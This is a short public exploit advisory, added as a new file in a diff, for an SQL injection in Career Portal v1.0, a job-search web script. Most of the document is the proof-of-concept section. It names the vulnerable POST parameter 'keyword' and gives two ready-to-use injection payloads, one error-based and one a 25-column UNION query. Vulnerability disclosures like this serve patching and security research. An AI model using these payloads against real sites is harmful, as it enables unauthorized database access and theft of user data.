@@ -1,0 +1,41 @@
+# Exploit Title: Career Portal v1.0 - SQL Injection
+# Date: 2017-10-17
+# Exploit Author: 8bitsec
+# Vendor Homepage: https://codecanyon.net/item/career-portal-online-job-search-script/20767278
+# Software Link: https://codecanyon.net/item/career-portal-online-job-search-script/20767278
+# Version: 1.0
+# Tested on: [Kali Linux 2.0 | Mac OS 10.12.6]
+# Email: contact@8bitsec.io
+# Contact: https://twitter.com/_8bitsec
+
+Release Date:
+=============
+2017-10-17
+
+Product & Service Introduction:
+===============================
+Career Portal is developed for creating an interactive job vacancy for candidates.
+
+Technical Details & Description:
+================================
+
+SQL injection on [keyword] parameter.
+
+Proof of Concept (PoC):
+=======================
+
+SQLi:
+
+https://localhost/[path]/job
+
+Parameter: keyword (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: keyword=s_term') AND (SELECT 8133 FROM(SELECT COUNT(*),CONCAT(0x716b6a7171,(SELECT (ELT(8133=8133,1))),0x71787a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ('kRoT'='kRoT&location_name[]=
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 25 columns
+    Payload: keyword=s_term') UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b6a7171,0x594547646454726868515056467764674e59726f4252436844774f41704a507353574e4b6d5a5973,0x71787a7871),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- zANd&location_name[]=
+
+==================
+8bitsec - [https://twitter.com/_8bitsec]
